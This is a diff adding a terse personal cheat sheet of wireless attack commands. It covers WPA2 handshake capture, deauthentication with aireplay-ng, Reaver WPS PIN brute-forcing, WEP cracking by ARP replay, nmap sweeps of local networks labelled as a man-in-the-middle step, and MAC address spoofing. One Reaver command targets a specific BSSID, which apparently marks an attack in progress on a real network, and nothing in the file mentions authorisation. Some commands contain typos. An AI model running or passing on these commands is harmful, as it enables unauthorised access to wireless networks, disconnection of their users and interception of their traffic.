@@ -1,0 +1,75 @@
+
+
+
+arimon-ng start wlan0
+
+ifconfig wlan0 down
+ifconfig wlan0 up
+ifconfig mon0 down
+ifconfig mon0 up
+
+airodump-ng mon0
+
+airodump-ng -c "number" -w "WPA2" --bssid "addres" --ivs mon0
+
+'STATION'
+
+aireplay-ng  -0 1 -e "name" mon0
+
+aireplay-ng --ignore-negative-one -0 1 -a "bssid" mon0
+
+aircrack-ng -w /location "logfile name"
+
+
+///Reaver
+
+wash -i wlan0mon
+
+reaver -i wlan0mon -b adadsa -vv (--fail-wait=360)
+
+///Better one
+
+reaver -i wlan0mon -b "addres" -d 30 -S -N -vv
+
+
+
+
+///Man in the middle attack
+
+rout "get gateway"
+ifconfig "get ip"
+
+nmap -sP 192.168.36.0/24  "ip but /24"
+
+nmap -O 192.168.0.0/24
+
+
+
+
+
+
+///Wifi progress 
+
+reaver -i wlan0mon -b F4:EC:38:BC:04:82 -d 60 -S -N -vv
+
+
+
+///Wep crack
+
+airodump-ng wlan0mon
+
+airodump-ng -c 'channel' -w 'file name' --bssid 'id'
+
+aireplay-ng -1 0 -a 'id' wlan0mon
+
+aireplay-ng -3 -b 'id' wlan0mon
+
+aircrack-ng 'filename-01.cap'
+
+
+/// Mac changer
+
+macchanger -r wlan0
+
+
+
